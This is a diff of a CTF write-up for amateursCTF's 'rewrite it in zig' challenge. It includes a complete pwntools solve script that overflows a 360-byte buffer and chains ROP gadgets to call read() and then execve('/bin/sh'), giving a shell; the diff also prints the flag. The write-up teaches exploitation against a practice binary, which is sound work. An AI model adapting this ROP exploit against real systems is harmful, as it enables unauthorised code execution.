@@ -51,7 +51,7 @@ Lets how many bytes we have to send before we hit the RSP and the return address
 - `cyclic 500` (copy this)
 - Run the binary `r` then pass the cyclic pattern
 - Check what RSP is (the last thing that was on the stack causing the seg fault)
-- `cyclic -o uaaaaaab` returns offset at **360** (-8 for RBP which we wanna control = **352**)
+- `cyclic -o uaaaaaab` returns offset at **360**
 ![name](/amateursctf-rewrite-it-in-zig/2025-11-21-163553.png#center)
 
 ### ROP Chain Strategy
@@ -60,7 +60,7 @@ The goal is to call `execve("/bin/sh", 0, 0)` ([execve() man page](https://man7.
 So now we need to find some [ROP Gadgets](https://ctf101.org/binary-exploitation/return-oriented-programming/) (small and useful snippets of assembly that already exist in the binary) and manipulate them in a way that first we read "/bin/sh" from our input into a writable memory location and then call that address to spawn a shell. The process of sequentially executing these gadgets, for an exploit is called **ROP Chaining**.
 
 #### Stage 1: reading to write? yes.
-So we first need to call `read(0, .bss, 8)` to read the 8 byte string "bin/sh" from our input into a writable memory section (.bss)
+So we first need to call the `read(0, .bss, 8)` syscall to read the 8 byte string "bin/sh" from our input into a writable memory section (.bss)
 ([read() man page](https://man7.org/linux/man-pages/man2/execve.2.html))
 #### Stage 2: spawn shell
 Now we can call `execve(.bss, 0, 0)` to spawn a shell (.bss contains our "/bin/sh" string)
@@ -70,97 +70,76 @@ There's usually a few gadgets that `pop` registers off of the stack and then cal
 
 A not very nice gadget however.. we will see in a second.
 
-
+Running `ropper --file chal --search "pop %"` will show us some gadgets that we can work with. Look for any nice gadgets and trry
 
 ## Solve script
 Completing the script:
 ```py {linenos=true}
-#!/usr/bin/env python3
-"""
-KEY INSIGHT:
-The syscall gadget does more than just syscall - it also adjusts the stack!
-  syscall
-  add rsp, 0x28  # Skips 40 bytes
-  pop rbp        # Pops 8 bytes
-  ret
-We must add 48 bytes of padding after each syscall to account for this.
-"""
-
 from pwn import *
 
 elf = ELF('./chal')
 context.binary = elf
 context.arch = 'amd64'
+context.gdb_binary = '/usr/local/bin/pwndbg'
+
 
 # ROP Gadgets
 pop_rax = 0x010c5cc4  # pop rax; ret
 pop_rdx = 0x010cf9ec  #pop rdx; ret
 pop_rsi_pop_rbp = 0x0104a153  # pop rsi; pop rbp; ret
-syscall = 0x01038e9a  # syscall; add rsp,0x28; pop rbp; ret
+pop_rdi_pop_rbp = 0x01050fc0  # pop rdi; pop rbp; ret
+syscall = 0x01067787
 
-# mov rdi,rdx; xor edx,edx; mov rax,rdi; ret
-mov_rdi_rdx_xor_edx = 0x010bc482  # Moves rdx→rdi, zeros rdx, copies rdi→rax
+padding = 360
+bss = elf.bss(0x200)  # Writable memory location for /bin/sh string
 
 
-# Writable memory location for /bin/sh string
-bss = elf.bss(0x200)
-
-# Buffer is at [rbp-0x160], so we need 0x160 (352) bytes to reach saved RBP
-padding = 0x160
-fake_rbp = 0xdeadbeefdeadbeef
-
-# ===== STAGE 1: read(0, bss, 8) =====
-# Call read syscall to write "/bin/sh\x00" to BSS
+# read(0, bss, 8)
 stage1 = flat(
-    # Set rdi = 0 (stdin file descriptor)
-    pop_rdx, 0,
-    mov_rdi_rdx_xor_edx,  # rdi=0, rdx=0, rax=0
+    # Set rdi = 0 (stdin)
+    # 2 pops, add garbage for rbp
+    pop_rdi_pop_rbp, 0, 0xdeadbeef,
 
-    # Set rsi = bss (buffer to write to)
-    pop_rsi_pop_rbp, bss, 0,
+    # Set rsi = bss (buffer)
+    pop_rsi_pop_rbp, bss, 0xdeadbeef,
 
-    # Set rdx = 8 (number of bytes to read)
+    # Set rdx = 8 (length)
     pop_rdx, 8,
 
-    # Set rax = 0 (read syscall number)
+    # Set rax = 0 (syscall: read)
     pop_rax, 0,
 
-    # Call read(0, bss, 8)
-    syscall,
-    b'A' * 0x28,  # Padding for "add rsp, 0x28"
-    0xdeadbeef,   # Fake rbp for "pop rbp"
+    syscall
 )
 
-# ===== STAGE 2: execve(bss, 0, 0) =====
-# Execute the /bin/sh string we just wrote
+# execve(bss, 0, 0)
 stage2 = flat(
     # Set rdi = bss (pointer to "/bin/sh")
-    pop_rdx, bss,
-    mov_rdi_rdx_xor_edx,  # rdi=bss, rdx=0
+    pop_rdi_pop_rbp, bss, 0xdeadbeef,
 
     # Set rsi = 0 (argv = NULL)
-    pop_rsi_pop_rbp, 0, 0,
+    pop_rsi_pop_rbp, 0, 0xdeadbeef,
 
-    # Set rax = 59 (execve syscall number)
+    # Set rdx = 0 (envp = NULL)
+    pop_rdx, 0,
+
+    # Set rax = 59 (syscall: execve)
     pop_rax, 59,
 
-    # Call execve(bss, 0, 0)
-    syscall,
+    syscall
 )
 
 # Build final payload
 payload = flat(
     b'A' * padding,  # Fill buffer up to saved RBP
-    fake_rbp,        # Overwrite saved RBP
-    stage1,          # ROP chain to read /bin/sh
-    stage2,          # ROP chain to execute it
+    stage1,          # ROP chain to read /bin/sh and write to bss
+    stage2,          # ROP chain to execute it 
 )
 
 p = elf.process()
 # p = remote('amt.rs', 27193)
 
-p.recvuntil(b'pwn.\n')
-p.send(payload)
+p.sendafter(b'pwn.\n', payload)
 
 # Wait for read() syscall, then send /bin/sh
 sleep(0.2)
@@ -168,6 +147,7 @@ p.send(b'/bin/sh\x00')
 
 success("Shell spawned!")
 p.interactive()
+
 ```
 
 ### Flag
@@ -175,3 +155,17 @@ p.interactive()
 `amateursCTF{i_love_zig_its_my_favorite_language_and_you_will_never_escape_the_zig_pwn_ahahaha}`
 
 ---
+## Personal Note
+ALWAYS USE **ropper**!
+
+I thought this challenge was harder than it actually was just because the first time I did it, **ROPgadget** couldn't find a clean syscall so I had to work with this abomination instead: `syscall; add rsp, 0x28; pop rbp; ret`
+
+This meant I had to add 0x28 of padding on the stack and then pop rbp with another 8 bytes of garbage (48 total) to ret the syscall:
+
+```py
+syscall,      # syscall; add rsp, 0x28; pop rbp; ret
+b'A' * 0x28,  # Padding for "add rsp, 0x28"
+0xdeadbeef,   # Fake rbp for "pop rbp"
+```
+
+I thought I was a genius for getting that to work 😔
